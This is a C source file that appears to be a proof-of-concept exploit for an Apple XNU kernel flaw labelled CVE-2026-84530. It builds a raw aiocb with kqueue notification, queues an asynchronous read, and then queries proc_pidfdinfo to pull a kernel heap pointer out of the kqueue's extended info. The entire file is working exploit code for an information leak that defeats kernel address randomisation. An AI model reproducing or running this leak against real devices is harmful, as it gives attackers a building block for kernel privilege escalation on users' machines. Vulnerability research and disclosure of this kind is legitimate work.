#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <aio.h>
#include <sys/event.h>
#include <sys/types.h>
#include <mach-o/dyld.h>

extern int proc_pidfdinfo(int pid, int fd, int flavor, void *buf, int bufsz);
#define PROC_PIDFDKQUEUE_EXTINFO 9
#define SIGEV_KEVENT_VAL         3
#define EVFILT_AIO_VAL           ((int16_t)(-3))
#define KQEXT_SDATA_OFFSET       72
#define KQEXT_STRIDE             88

static char g_result[1024];

uint64_t cve_84530_leak(void) {

    /* --- Step 1: create a real regular file in app container --- */
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    char tmppath[512];
    snprintf(tmppath, sizeof(tmppath), "%s/Documents/aio_poc.bin", home);
    int wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    if (wfd < 0) {
        /* fallback: try /tmp */
        snprintf(tmppath, sizeof(tmppath), "/tmp/aio_poc_%d.bin", getpid());
        wfd = open(tmppath, O_RDWR|O_CREAT|O_TRUNC, 0600);
    }
    if (wfd < 0) {
        snprintf(g_result, sizeof(g_result),
            "Cannot create temp file errno=%d (%s)", errno, strerror(errno));
        return 0;
    }
    const char *seed = "CVE-2026-84530-POC-SEED-DATA-XNU";
    write(wfd, seed, strlen(seed));
    close(wfd);

    int fd = open(tmppath, O_RDONLY);
    if (fd < 0) {
        snprintf(g_result, sizeof(g_result),
            "open(%s) failed errno=%d", tmppath, errno);
        return 0;
    }

    /* --- Step 2: SIGEV_NONE probe — confirms basic AIO works --- */
    struct aiocb probe;
    static char probebuf[64];
    memset(&probe, 0, sizeof(probe));
    probe.aio_fildes = fd;
    probe.aio_buf    = probebuf;
    probe.aio_nbytes = 16;
    probe.aio_offset = 0;
    probe.aio_sigevent.sigev_notify = 0; /* SIGEV_NONE */

    int probe_ret = aio_read(&probe);
    if (probe_ret != 0) {
        snprintf(g_result, sizeof(g_result),
            "PROBE SIGEV_NONE FAILED ret=%d errno=%d (%s)\n"
            "AIO itself is broken — not just SIGEV_KEVENT\n"
            "file: %s",
            probe_ret, errno, strerror(errno), tmppath);
        close(fd); return 0;
    }

    /* Wait for probe to complete */
    const struct aiocb *list[1] = { &probe };
    aio_suspend(list, 1, NULL);
    int probe_err = aio_error(&probe);
    aio_return(&probe);

    if (probe_err != 0) {
        snprintf(g_result, sizeof(g_result),
            "PROBE aio_read queued OK but completed with error=%d", probe_err);
        close(fd); return 0;
    }

    /* --- Step 3: SIGEV_KEVENT via raw byte layout --- */
    /* aiocb layout on arm64 (natural alignment):
     *   +0  int   aio_fildes
     *   +4  [pad]
     *   +8  off_t aio_offset
     *   +16 void* aio_buf
     *   +24 size_t aio_nbytes
     *   +32 int   aio_reqprio
     *   +36 [pad]
     *   +40 sigevent:
     *         +40 int  sigev_notify         <- SIGEV_KEVENT=3
     *         +44 int  sigev_signo
     *         +48 u64  sigev_value
     *         +56 u64  sigev_notify_function
     *         +64 u64  sigev_notify_attributes
     *         +72 u32  sigev_notify_kevent_flags
     *         +76 u32  sigev_notify_port
     *         +80 int  sigev_notify_kqueue  <- kq fd
     */
    int kq = kqueue();
    if (kq < 0) {
        snprintf(g_result, sizeof(g_result), "kqueue() failed errno=%d", errno);
        close(fd); return 0;
    }

    /* Use a 256-byte zero buffer — larger than any aiocb variant */
    static char cbuf[256];
    static char iobuf[64];
    memset(cbuf, 0, sizeof(cbuf));

    *(int     *)(cbuf +  0) = fd;       /* aio_fildes   */
    *(int64_t *)(cbuf +  8) = 0;        /* aio_offset   */
    *(void   **)(cbuf + 16) = iobuf;    /* aio_buf      */
    *(uint64_t*)(cbuf + 24) = 16;       /* aio_nbytes   */
    *(int     *)(cbuf + 32) = 0;        /* aio_reqprio  */
    *(int     *)(cbuf + 40) = SIGEV_KEVENT_VAL;  /* sigev_notify = 3 */
    *(int     *)(cbuf + 80) = kq;       /* sigev_notify_kqueue */

    int ret = aio_read((struct aiocb *)cbuf);
    if (ret != 0) {
        int saved = errno;
        /* Try alternate offset for sigev_notify_kqueue: 72 instead of 80 */
        memset(cbuf + 40, 0, 100);
        *(int *)(cbuf + 40) = SIGEV_KEVENT_VAL;
        *(int *)(cbuf + 72) = kq;
        int ret2 = aio_read((struct aiocb *)cbuf);
        if (ret2 != 0) {
            snprintf(g_result, sizeof(g_result),
                "PROBE SIGEV_NONE OK (AIO works)\n"
                "SIGEV_KEVENT @kq_offset=80 failed errno=%d (%s)\n"
                "SIGEV_KEVENT @kq_offset=72 also failed errno=%d (%s)\n"
                "SIGEV_KEVENT not supported or kqueue offset wrong",
                saved, strerror(saved), errno, strerror(errno));
            close(kq); close(fd); return 0;
        }
        /* alt offset 72 worked */
    }

    usleep(30000);

    /* --- Step 4: proc_pidfdinfo to read leaked kernel ptr --- */
    uint8_t extbuf[4096];
    memset(extbuf, 0, sizeof(extbuf));
    int n = proc_pidfdinfo(getpid(), kq, PROC_PIDFDKQUEUE_EXTINFO,
                           extbuf, (int)sizeof(extbuf));
    if (n <= 0) {
        snprintf(g_result, sizeof(g_result),
            "aio_read SIGEV_KEVENT queued OK\n"
            "proc_pidfdinfo failed errno=%d (%s)",
            errno, strerror(errno));
        close(kq); close(fd); return 0;
    }

    int count = n / KQEXT_STRIDE;
    for (int i = 0; i < count; i++) {
        uint8_t  *entry  = extbuf + i * KQEXT_STRIDE;
        int16_t   filter = *(int16_t  *)(entry + 8);
        int64_t   data   = *(int64_t  *)(entry + 32);
        uint64_t  sdata  = *(uint64_t *)(entry + KQEXT_SDATA_OFFSET);
        if (filter == EVFILT_AIO_VAL) {
            snprintf(g_result, sizeof(g_result),
                "SUCCESS - CVE-2026-84530\n"
                "EVFILT_AIO found!\n"
                "kqext_kev.data = 0x%llx (should be 0)\n"
                "kqext_sdata    = 0x%llx  <- KERNEL HEAP PTR",
                (unsigned long long)data,
                (unsigned long long)sdata);
            close(kq); close(fd);
            return sdata;
        }
    }

    snprintf(g_result, sizeof(g_result),
        "aio_read SIGEV_KEVENT queued OK\n"
        "proc_pidfdinfo returned %d knotes — no EVFILT_AIO\n"
        "kq=%d fd=%d", count, kq, fd);
    close(kq); close(fd);
    return 0;
}

const char *cve_84530_leak_str(void) { return g_result; }
